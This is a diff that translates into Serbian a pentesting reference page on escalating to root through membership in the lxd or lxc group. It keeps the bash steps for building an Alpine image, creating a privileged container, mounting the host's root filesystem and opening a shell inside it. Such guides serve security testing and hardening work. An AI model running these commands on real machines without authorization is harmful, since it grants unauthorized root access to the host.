@@ -1,15 +1,14 @@
-# lxd/lxc Group - Privilege escalation
+# lxd/lxc Grupa - Eskalacija privilegija
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-If you belong to _**lxd**_ **or** _**lxc**_ **group**, you can become root
+Ako pripadate _**lxd**_ **ili** _**lxc**_ **grupi**, možete postati root
 
-## Exploiting without internet
+## Eksploatacija bez interneta
 
-### Method 1
+### Metoda 1
 
-You can install in your machine this distro builder: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(follow the instructions of the github):
-
+Možete instalirati na vašem računaru ovaj distro builder: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(pratite uputstva sa github-a):
 ```bash
 sudo su
 # Install requirements
@@ -34,9 +33,7 @@ sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
 ## Using build-lxc
 sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
 ```
-
-Upload the files **lxd.tar.xz** and **rootfs.squashfs**, add the image to the repo and create a container:
-
+Otpremite datoteke **lxd.tar.xz** i **rootfs.squashfs**, dodajte sliku u repozitorijum i kreirajte kontejner:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -51,23 +48,19 @@ lxc list
 
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
-
 > [!CAUTION]
-> If you find this error _**Error: No storage pool found. Please create a new storage pool**_\
-> Run **`lxd init`** and **repeat** the previous chunk of commands
+> Ako pronađete ovu grešku _**Greška: Nema pronađenog skladišnog bazena. Molimo kreirajte novi skladišni bazen**_\
+> Pokrenite **`lxd init`** i **ponovite** prethodni deo komandi
 
-Finally you can execute the container and get root:
-
+Na kraju možete izvršiti kontejner i dobiti root:
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
+### Metoda 2
 
-### Method 2
-
-Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.
-
+Izgradite Alpine sliku i pokrenite je koristeći flag `security.privileged=true`, prisiljavajući kontejner da komunicira kao root sa host datotečnim sistemom.
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -87,5 +80,4 @@ lxc init myimage mycontainer -c security.privileged=true
 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 ```
-
 {{#include ../../../banners/hacktricks-training.md}}
